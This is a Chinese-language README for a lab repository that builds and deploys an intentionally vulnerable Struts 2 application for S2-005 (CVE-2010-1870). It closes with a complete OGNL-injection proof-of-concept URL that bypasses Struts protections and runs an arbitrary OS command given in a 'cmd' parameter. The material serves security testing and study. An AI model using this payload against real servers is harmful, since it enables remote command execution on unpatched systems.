# 环境
Requires Java 1.8+ and Maven 3.x+

# 使用方法
1.下载
git clone https://git.oschina.net/0d/Struts2_bugs.git

2.查看远程分支
git branch -a

3.切换到分支
git checkout 分支名
如git checkout S2-005

4.打包
mvn clean package

5.部署在Tomcat中
将\target中生成的Struts2-005.war复制到Tomcat下的webapps目录中，然后开启Tomcat

访问http://127.0.0.1:8080/Struts2-005/index.action

# 相关信息

1.S2-005

CVE-2010-1870

影响版本：Struts 2.0.0 – Struts 2.1.8.1 

官方公告：http://struts.apache.org/docs/s2-005.html

POC:
http://127.0.0.1:8080/Struts2-005/index.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(h)(('\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter("cmd"))')(d))&(i)(('\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())')(d))&(i01)(('\43webStr\75new\40byte[1000]')(d))&(i1)(('\43webRootzproreader.readFully(\43webStr)')(d))&(i111)(('\43webStr12\75new\40java.lang.String(\43webStr)')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43webStr12)')(d))&(i99)(('\43xman.getWriter().close()')(d))&cmd=cmd /c whoami
